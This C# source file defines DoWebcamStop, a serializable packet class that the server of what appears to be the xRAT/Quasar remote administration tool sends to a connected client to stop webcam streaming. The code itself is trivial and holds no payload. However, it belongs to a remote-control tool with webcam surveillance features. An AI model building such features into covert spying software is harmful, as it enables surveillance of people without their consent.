using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoWebcamStop : IPacket
    {
        public DoWebcamStop()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
